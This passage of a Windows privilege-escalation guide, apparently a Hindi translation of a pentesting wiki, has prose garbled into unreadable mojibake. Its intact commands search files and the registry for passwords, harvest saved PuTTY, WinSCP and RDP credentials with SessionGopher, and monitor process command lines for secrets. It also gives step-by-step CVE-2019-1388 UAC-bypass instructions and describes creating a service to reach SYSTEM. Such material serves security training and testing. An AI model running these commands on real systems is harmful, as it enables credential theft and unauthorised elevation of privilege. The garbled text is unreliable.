рд╣рдорд▓рд╛рд╡рд╛рджрд┐рдпреЛрдВ рдХреЛ COM рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреИрд╕реЗ рдПрдХ рд╕реНрдерд┐рд░рддрд╛ рддрдВрддреНрд░ рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЗрд╕реЗ рд╕реАрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪреЗрдВ:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд╕рд╛рдорд╛рдиреНрдп рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬ**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдлрд╝рд╛рдЗрд▓ рдирд╛рдо рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдЦреЛрдЬреЗрдВ**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рдХреБрдВрдЬреА рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬреЗрдВ**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### рдЙрдкрдХрд░рдг рдЬреЛ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬрддреЗ рд╣реИрдВ

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **рдПрдХ msf** рдкреНрд▓рдЧрдЗрди рд╣реИ рдЬрд┐рд╕реЗ рдореИрдВрдиреЗ рдмрдирд╛рдпрд╛ рд╣реИ рдпрд╣ рдкреНрд▓рдЧрдЗрди **рд╢рд┐рдХрд╛рд░ рдХреЗ рднреАрддрд░ рдкрд╛рд╕рд╡рд░реНрдб рдЦреЛрдЬрдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рддреНрдпреЗрдХ metasploit POST рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдЗрд╕ рдкреГрд╖реНрда рдореЗрдВ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рдкрд╛рд╕рд╡рд░реНрдб рд╡рд╛рд▓реЗ рд╕рднреА рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИред\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдирд┐рдХрд╛рд▓рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЙрдкрдХрд░рдг [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **рд╕рддреНрд░**, **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо** рдФрд░ **рдкрд╛рд╕рд╡рд░реНрдб** рдХреА рдЦреЛрдЬ рдХрд░рддрд╛ рд╣реИ рдХрдИ рдЙрдкрдХрд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП рдЬреЛ рдЗрд╕ рдбреЗрдЯрд╛ рдХреЛ рд╕реНрдкрд╖реНрдЯ рдкрд╛рда рдореЗрдВ рд╕рд╣реЗрдЬрддреЗ рд╣реИрдВ (PuTTY, WinSCP, FileZilla, SuperPuTTY, рдФрд░ RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## рд▓реАрдХ рд╣реИрдВрдбрд▓рд░реНрд╕

рд╕реЛрдЪрд┐рдП рдХрд┐ **рдПрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЬреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЦреЛрд▓рддреА рд╣реИ** (`OpenProcess()`) **рдкреВрд░реНрдг рдЕрдзрд┐рдХрд╛рд░** рдХреЗ рд╕рд╛рдеред рдЙрд╕реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ **рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рддреА рд╣реИ** (`CreateProcess()`) **рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд▓реЗрдХрд┐рди рдореБрдЦреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рднреА рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓реНрд╕ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрддреА рд╣реИ**ред\
рдлрд┐рд░, рдЕрдЧрд░ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рдкреВрд░реНрдг рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ**, рддреЛ рдЖрдк **рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ OpenProcess() рдХреЗ рд╕рд╛рде рдмрдирд╛рдИ рдЧрдИ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╣реИ** рдФрд░ **рдПрдХ рд╢реИрд▓рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЛ рдкрдврд╝реЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдХрд┐ рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рдЧрдбрд╝рдмрдбрд╝реА рдХреЛ рдХреИрд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ рдФрд░ рдЙрд╕рдХрд╛ рд╢реЛрд╖рдг рдХреИрд╕реЗ рдХрд░реЗрдВ**ред](leaked-handle-exploitation.md)\
[рдЗрд╕ **рдЕрдиреНрдп рдкреЛрд╕реНрдЯ рдХреЛ рдкрдврд╝реЗрдВ рдПрдХ рдЕрдзрд┐рдХ рдкреВрд░реНрдг рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреИрд╕реЗ рдЯреЗрд╕реНрдЯ рдХрд░реЗрдВ рдФрд░ рдЕрдиреНрдп рдЦреБрд▓реЗ рд╣реИрдВрдбрд▓рд░реНрд╕ рдХрд╛ рд╢реЛрд╖рдг рдХрд░реЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдФрд░ рдзрд╛рдЧреЛрдВ рдХрд╛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рд▓реЗрдирд╛ рдЬрд┐рдиреНрд╣реЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реНрддрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рд╕рд╛рде рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рд╛ рд╣реИ (рдХреЗрд╡рд▓ рдкреВрд░реНрдг рдЕрдзрд┐рдХрд╛рд░ рдирд╣реАрдВ)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## рдиреЗрдореНрдб рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ рдЕрдиреБрдзрд╛рд░рдг

рд╕рд╛рдЭрд╛ рд╕реНрдореГрддрд┐ рд╕реЗрдЧрдореЗрдВрдЯ, рдЬрд┐рд╕реЗ **рдкрд╛рдЗрдк** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░ рдФрд░ рдбреЗрдЯрд╛ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреА рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВред

Windows рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **рдиреЗрдореНрдб рдкрд╛рдЗрдкреНрд╕** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреЛ рдЕрд╕рдВрдмрдВрдзрд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдбреЗрдЯрд╛ рд╕рд╛рдЭрд╛ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди рдиреЗрдЯрд╡рд░реНрдХреЛрдВ рдкрд░ рднреАред рдпрд╣ рдПрдХ рдХреНрд▓рд╛рдЗрдВрдЯ/рд╕рд░реНрд╡рд░ рд╕рдВрд░рдЪрдирд╛ рдХреА рддрд░рд╣ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рднреВрдорд┐рдХрд╛рдПрдБ **рдиреЗрдореНрдб рдкрд╛рдЗрдк рд╕рд░реНрд╡рд░** рдФрд░ **рдиреЗрдореНрдб рдкрд╛рдЗрдк рдХреНрд▓рд╛рдЗрдВрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХреА рдЧрдИ рд╣реИрдВред

рдЬрдм рдбреЗрдЯрд╛ рдПрдХ рдкрд╛рдЗрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ** рджреНрд╡рд╛рд░рд╛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдкрд╛рдЗрдк рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ **рд╕рд░реНрд╡рд░** рдЙрд╕ **рдХреНрд▓рд╛рдЗрдВрдЯ** рдХреА **рдкрд╣рдЪрд╛рди рд▓реЗрдиреЗ** рдХреА рдХреНрд╖рдорддрд╛ рд░рдЦрддрд╛ рд╣реИ, рдпрджрд┐ рдЙрд╕рдХреЗ рдкрд╛рд╕ рдЖрд╡рд╢реНрдпрдХ **SeImpersonate** рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВред рдПрдХ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реА рдкреНрд░рдХреНрд░рд┐рдпрд╛** рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдирд╛ рдЬреЛ рдПрдХ рдкрд╛рдЗрдк рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдВрд╡рд╛рдж рдХрд░рддреА рд╣реИ рдФрд░ рдЬрд┐рд╕реЗ рдЖрдк рдЕрдиреБрдХрд░рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрд╕реЗ рдПрдХ рдЕрд╡рд╕рд░ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ **рдЙрдЪреНрдЪрддрд░ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдЬрдм рд╡рд╣ рдкрд╛рдЗрдк рдХреЗ рд╕рд╛рде рдЖрдкрдХреЗ рд╕реНрдерд╛рдкрд┐рдд рдкрд╛рдЗрдк рдХреЗ рд╕рд╛рде рдмрд╛рддрдЪреАрдд рдХрд░рддреА рд╣реИред рдЗрд╕ рддрд░рд╣ рдХреЗ рд╣рдорд▓реЗ рдХреЛ рдХреИрд╕реЗ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреЗ рд▓рд┐рдП рдорджрджрдЧрд╛рд░ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛рдПрдБ рдпрд╣рд╛рдБ рдкрд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ [**рдпрд╣рд╛рдБ**](named-pipe-client-impersonation.md) рдФрд░ [**рдпрд╣рд╛рдБ**](./#from-high-integrity-to-system)ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрдкрдХрд░рдг рдирд╛рдорд┐рдд рдкрд╛рдЗрдк рд╕рдВрдЪрд╛рд░ рдХреЛ **рдПрдХ рдЙрдкрдХрд░рдг рдЬреИрд╕реЗ рдмрд░реНрдк рдХреЗ рд╕рд╛рде рдЖрд╡рд░рдг рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **рдФрд░ рдпрд╣ рдЙрдкрдХрд░рдг рд╕рднреА рдкрд╛рдЗрдкреЛрдВ рдХреЛ рд╕реВрдЪреАрдмрджреНрдз рдХрд░рдиреЗ рдФрд░ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ privescs рдкрд╛рдП рдЬрд╛ рд╕рдХреЗрдВ** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## рд╡рд┐рд╡рд┐рдз

### **рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд▓рд┐рдП рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХреА рдирд┐рдЧрд░рд╛рдиреА**

рдЬрдм рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рд╢реИрд▓ рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рд╢реЗрдбреНрдпреВрд▓ рдХрд┐рдП рдЧрдП рдХрд╛рд░реНрдп рдпрд╛ рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛рдПрдВ рднреА рдЪрд▓ рд░рд╣реА рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ **рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдкрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдкрд╛рд░рд┐рдд** рдХрд░ рд░рд╣реА рд╣реЛрдВред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдкреНрд░рддрд┐ рджреЛ рд╕реЗрдХрдВрдб рдореЗрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрдорд╛рдВрдб рд▓рд╛рдЗрди рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рд╡рд░реНрддрдорд╛рди рд╕реНрдерд┐рддрд┐ рдХреЛ рдкрд┐рдЫрд▓реЗ рд╕реНрдерд┐рддрд┐ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ, рдХрд┐рд╕реА рднреА рдЕрдВрддрд░ рдХреЛ рдЖрдЙрдЯрдкреБрдЯ рдХрд░рддрд╛ рд╣реИред
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC рдмрд╛рдпрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЧреНрд░рд╛рдлрд┐рдХрд▓ рдЗрдВрдЯрд░рдлреЗрд╕ рддрдХ рдкрд╣реБрдВрдЪ рд╣реИ (рдХрдВрд╕реЛрд▓ рдпрд╛ рдЖрд░рдбреАрдкреА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ) рдФрд░ UAC рд╕рдХреНрд╖рдо рд╣реИ, рддреЛ рдХреБрдЫ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рд╡рд┐рдВрдбреЛрдЬ рдореЗрдВ рдЕрдирд╡рд┐рд╢реЗрд╖рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рд╕реЗ рдЯрд░реНрдорд┐рдирд▓ рдпрд╛ "NT\AUTHORITY SYSTEM" рдЬреИрд╕реЗ рдХрд┐рд╕реА рдЕрдиреНрдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЪрд▓рд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИред

рдЗрд╕рд╕реЗ рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЙрдиреНрдирдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рдПрдХ рд╣реА рд╕рдордп рдореЗрдВ рдПрдХ рд╣реА рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рдЙрд▓реНрд▓рдВрдШрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдХреБрдЫ рднреА рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ рдФрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдмрд╛рдЗрдирд░реА, рдорд╛рдЗрдХреНрд░реЛрд╕реЙрдлреНрдЯ рджреНрд╡рд╛рд░рд╛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдФрд░ рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рдХреБрдЫ рдкреНрд░рднрд╛рд╡рд┐рдд рд╕рд┐рд╕реНрдЯрдо рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╣реИрдВ:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
рдЗрд╕ рд╡рдВрд░реВрдкрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

```
1) HHUPD.EXE рдлрд╝рд╛рдЗрд▓ рдкрд░ рджрд╛рдпрд╛рдБ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдПрдВред

2) UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдкреНрд░рдХрдЯ рд╣реЛрдиреЗ рдкрд░, "рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рджрд┐рдЦрд╛рдПрдВ" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред

3) "рдкреНрд░рдХрд╛рд╢рдХ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЬрд╛рдирдХрд╛рд░реА рджрд┐рдЦрд╛рдПрдВ" рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред

4) рдпрджрд┐ рд╕рд┐рд╕реНрдЯрдо рд╡рдВрд░реВрдкрддрд╛ рд╣реИ, рддреЛ "рдЬрд╛рд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛" URL рд▓рд┐рдВрдХ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдиреЗ рдкрд░, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

5) рд╕рд╛рдЗрдЯ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд▓реЛрдб рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ рдФрд░ "рдЗрд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рд╕рд╣реЗрдЬреЗрдВ" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдПрдХ explorer.exe рд╡рд┐рдВрдбреЛ рдкреНрд░рдХрдЯ рд╣реЛред

6) рдПрдХреНрд╕рдкреНрд▓реЛрд░рд░ рд╡рд┐рдВрдбреЛ рдХреЗ рдкрддреЗ рдорд╛рд░реНрдЧ рдореЗрдВ, cmd.exe, powershell.exe рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЗрдВрдЯрд░реИрдХреНрдЯрд┐рд╡ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджрд░реНрдЬ рдХрд░реЗрдВред

7) рдЕрдм рдЖрдкрдХреЗ рдкрд╛рд╕ "NT\AUTHORITY SYSTEM" рдХрдорд╛рдВрдб рдкреНрд░реЙрдореНрдкреНрдЯ рд╣реЛрдЧрд╛ред

8) рдЕрдкрдиреЗ рдбреЗрд╕реНрдХрдЯреЙрдк рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯрдЕрдк рдФрд░ UAC рдкреНрд░реЙрдореНрдкреНрдЯ рдХреЛ рд░рджреНрдж рдХрд░рдирд╛ рди рднреВрд▓реЗрдВред
```

рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрд╕ GitHub рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рднреА рдЖрд╡рд╢реНрдпрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ рдФрд░ рдЬрд╛рдирдХрд╛рд░реА рд╣реИ:

https://github.com/jas502n/CVE-2019-1388

## рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ / UAC рдмрд╛рдпрдкрд╛рд╕ рдХреЛ рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рдореЗрдВ рд╕реЗ

**рдЕрдЦрдВрдбрддрд╛ рд╕реНрддрд░ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП** рдпрд╣ рдкрдврд╝реЗрдВ:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

рдлрд┐рд░ **UAC рдФрд░ UAC рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдпрд╣ рдкрдврд╝реЗрдВ:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рд╕реНрддрд░ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рддрдХ**

### **рдирдИ рд╕реЗрд╡рд╛**

рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдЙрдЪреНрдЪ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдкрд░ рдЪрд▓ рд░рд╣реЗ рд╣реИрдВ, рддреЛ **рд╕рд┐рд╕реНрдЯрдо рддрдХ рдкрд╣реБрдВрдЪрдирд╛** рдЖрд╕рд╛рди рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдмрд╕ **рдПрдХ рдирдИ рд╕реЗрд╡рд╛ рдмрдирд╛рдХрд░ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

рдПрдХ рдЙрдЪреНрдЪ рдЕрд╡рдзрд┐ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕реЗ рдЖрдк **AlwaysInstallElevated рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдПрдВрдЯреНрд░реА** рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ _**.msi**_ рд░реИрдкрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд░рд┐рд╡рд░реНрд╕ рд╢реИрд▓ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[рдЗрд╕рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдХреБрдВрдЬреАрдпреЛрдВ рдФрд░ рдХреИрд╕реЗ рдПрдХ _.msi_ рдкреИрдХреЗрдЬ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдпрд╣рд╛рдБ рдорд┐рд▓реЗрдЧреАред](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**рдЖрдк** [**рдпрд╣рд╛рдБ рдХреЛрдб рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](seimpersonate-from-high-to-system.md)**ред**

### From SeDebug + SeImpersonate to Full Token privileges

